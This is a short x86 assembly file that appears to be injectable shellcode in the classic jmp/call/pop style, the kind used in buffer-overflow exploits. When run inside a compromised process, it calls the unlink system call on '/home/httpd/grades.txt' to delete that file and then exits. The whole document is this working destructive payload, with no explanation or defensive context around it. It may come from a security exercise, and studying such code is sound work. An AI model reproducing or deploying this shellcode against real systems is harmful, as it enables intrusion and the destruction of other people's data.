#include <sys/syscall.h>

#define STRING  "/home/httpd/grades.txt"

.globl main
        .type   main, @function

 main:
        jmp     calladdr

 popladdr:
        popl    %esi

        movl    %esi,%ebx
        movl    $SYS_unlink,%eax
        int     $0x80
        xorl    %ebx,%ebx
        movl    %ebx,%eax
        inc     %eax
        int     $0x80

 calladdr:
        call    popladdr
        .ascii  STRING

